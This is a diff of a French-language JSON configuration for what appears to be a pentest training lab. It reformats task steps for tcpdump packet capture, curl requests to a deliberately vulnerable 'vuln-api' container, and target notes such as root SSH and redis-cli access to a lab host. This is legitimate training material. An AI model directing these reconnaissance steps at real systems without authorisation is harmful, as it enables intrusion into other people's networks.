-        { "title": "Générer du trafic", "content": "Dans un autre terminal (ou make shell dans un 2e terminal), fais plusieurs requêtes : curl http://vuln-api:5000/api/health et curl http://vuln-api:5000/api/users/1.", "command": "curl http://vuln-api:5000/api/health\ncurl http://vuln-api:5000/api/users/1", "tip": "Depuis le conteneur attaquant, vuln-api est joignable par son nom.", "learn": "Le trafic HTTP apparaîtra en clair dans la capture (pas de TLS entre conteneurs)." },
-        { "title": "Arrêter et lire la capture", "content": "Arrête tcpdump (Ctrl+C). Puis lis le fichier : tcpdump -r /workspace/cap.pcap -n. Ou avec tshark : tshark -r /workspace/cap.pcap -V.", "command": "tcpdump -r /workspace/cap.pcap -n", "tip": "tshark -r cap.pcap affiche les couches (HTTP, TCP, IP).", "learn": "L’analyse de paquets est la base du forensique réseau et du débogage." }
+        {
+          "title": "Lancer une capture tcpdump",
+          "content": "Depuis l’attaquant, lance tcpdump -i any -w /workspace/cap.pcap host vuln-api. Garde la commande en cours.",
+          "command": "tcpdump -i any -w /workspace/cap.pcap host vuln-api",
+          "tip": "Lance dans un terminal (ou en arrière-plan avec &).",
+          "learn": "tcpdump permet de capturer tout le trafic sur une interface (ou any)."
+        },
+        {
+          "title": "Générer du trafic",
+          "content": "Dans un autre terminal (ou make shell dans un 2e terminal), fais plusieurs requêtes : curl http://vuln-api:5000/api/health et curl http://vuln-api:5000/api/users/1.",
+          "command": "curl http://vuln-api:5000/api/health\ncurl http://vuln-api:5000/api/users/1",
+          "tip": "Depuis le conteneur attaquant, vuln-api est joignable par son nom.",
+          "learn": "Le trafic HTTP apparaîtra en clair dans la capture (pas de TLS entre conteneurs)."
+        },
+        {
+          "title": "Arrêter et lire la capture",
+          "content": "Arrête tcpdump (Ctrl+C). Puis lis le fichier : tcpdump -r /workspace/cap.pcap -n. Ou avec tshark : tshark -r /workspace/cap.pcap -V.",
+          "command": "tcpdump -r /workspace/cap.pcap -n",
+          "tip": "tshark -r cap.pcap affiche les couches (HTTP, TCP, IP).",
+          "learn": "L’analyse de paquets est la base du forensique réseau et du débogage."
+        }
       ]
     },
     {
@@ -526,13 +827,39 @@
       "category": "red",
       "time": "15 min",
       "machines": [
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "Tes outils" },
-        { "name": "Vue Engagements", "url": "#", "note": "Plateforme > Cibles & Proxy" }
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "Tes outils"
+        },
+        {
+          "name": "Vue Engagements",
+          "url": "#",
+          "note": "Plateforme > Cibles & Proxy"
+        }
       ],
       "tasks": [
-        { "title": "Ouvrir la vue Engagements", "content": "Dans la plateforme, va dans « Cibles & Proxy » (Engagements). Tu peux y ajouter des cibles personnalisées (nom, URL, notes).", "command": null, "tip": "Utilise cette vue pour noter les IP/URL des cibles du lab (vuln-network, vuln-api) ou de tes propres targets.", "learn": "Documenter ses cibles et objectifs aide à structurer un pentest ou un lab perso." },
-        { "title": "Ajouter une cible lab", "content": "Ajoute une cible : nom « vuln-network », URL ou note « ssh root@vuln-network, redis-cli -h vuln-network ». Tu peux aussi créer des sessions (sauvegarder l’état de tes cibles/todos).", "command": null, "tip": "Les sessions permettent de reprendre plus tard avec la même liste de cibles et de notes.", "learn": "En vrai engagement, on garde des sessions par client ou par périmètre." },
-        { "title": "Exporter ou garder des preuves", "content": "Depuis l’attaquant, tes captures (tcpdump -w) et fichiers sont dans /workspace. Tu peux les copier vers ta machine avec docker cp. Le journal d’activité de la plateforme enregistre tes navigations et copies de commandes.", "command": "docker cp lab-attaquant:/workspace/cap.pcap ./", "tip": "Sur ta machine hôte, depuis le dossier du projet. Pour un rapport, documente commandes + captures + screenshots.", "learn": "Traçabilité et preuves sont essentielles en pentest et en forensique." }
+        {
+          "title": "Ouvrir la vue Engagements",
+          "content": "Dans la plateforme, va dans « Cibles & Proxy » (Engagements). Tu peux y ajouter des cibles personnalisées (nom, URL, notes).",
+          "command": null,
+          "tip": "Utilise cette vue pour noter les IP/URL des cibles du lab (vuln-network, vuln-api) ou de tes propres targets.",
+          "learn": "Documenter ses cibles et objectifs aide à structurer un pentest ou un lab perso."
+        },
+        {
+          "title": "Ajouter une cible lab",
+          "content": "Ajoute une cible : nom « vuln-network », URL ou note « ssh root@vuln-network, redis-cli -h vuln-network ». Tu peux aussi créer des sessions (sauvegarder l’état de tes cibles/todos).",
+          "command": null,
+          "tip": "Les sessions permettent de reprendre plus tard avec la même liste de cibles et de notes.",
+          "learn": "En vrai engagement, on garde des sessions par client ou par périmètre."
+        },
+        {
+          "title": "Exporter ou garder des preuves",
+          "content": "Depuis l’attaquant, tes captures (tcpdump -w) et fichiers sont dans /workspace. Tu peux les copier vers ta machine avec docker cp. Le journal d’activité de la plateforme enregistre tes navigations et copies de commandes.",
+          "command": "docker cp lab-attaquant:/workspace/cap.pcap ./",
+          "tip": "Sur ta machine hôte, depuis le dossier du projet. Pour un rapport, documente commandes + captures + screenshots.",
+          "learn": "Traçabilité et preuves sont essentielles en pentest et en forensique."
+        }
       ]
     }
   ]
